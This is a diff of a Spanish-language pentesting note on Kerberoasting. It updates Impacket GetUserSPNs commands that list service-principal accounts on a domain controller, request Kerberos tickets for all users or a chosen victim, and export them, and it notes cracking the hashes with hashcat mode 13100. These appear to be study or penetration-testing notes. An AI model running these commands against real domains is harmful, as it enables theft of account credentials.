@@ -3,13 +3,13 @@ Debemos utilizarlo contra un DC y necesitamos tener credenciales de un usuario (
 una shell en contexto de un usuario de dominio o una cuenta de system.
 
 Listar los usuarios con SPN
-GetUserSPNs.py -dc-ip <dc_ip> <dominio>/<user>
+sudo impacket-GetUserSPNs -dc-ip <dc_ip> <dominio>/<user>
 
 Pedir tickets para todos los usuarios:
-GetUserSPNs.py -dc-ip <ip_dc> <dominio>/<user>:'pass' -request
+sudo impacket-GetUserSPNs -dc-ip <ip_dc> <dominio>/<user>:'pass' -request
 
 Pedir tickets para un usuario puntual:
-GetUserSPNs.py -dc-ip <ip_dc> <dominio>/<user> -request-user <user_victima> -outputfile <file_de_guardado>  (es importante generar el export así luego podemos crackear el archivo)
+sudo impacket-GetUserSPNs -dc-ip <ip_dc> <dominio>/<user> -request-user <user_victima> -outputfile <file_de_guardado>  (es importante generar el export así luego podemos crackear el archivo)
 
 
 Una vez tenemos el hash podemos crackearlo con hashcat 13100
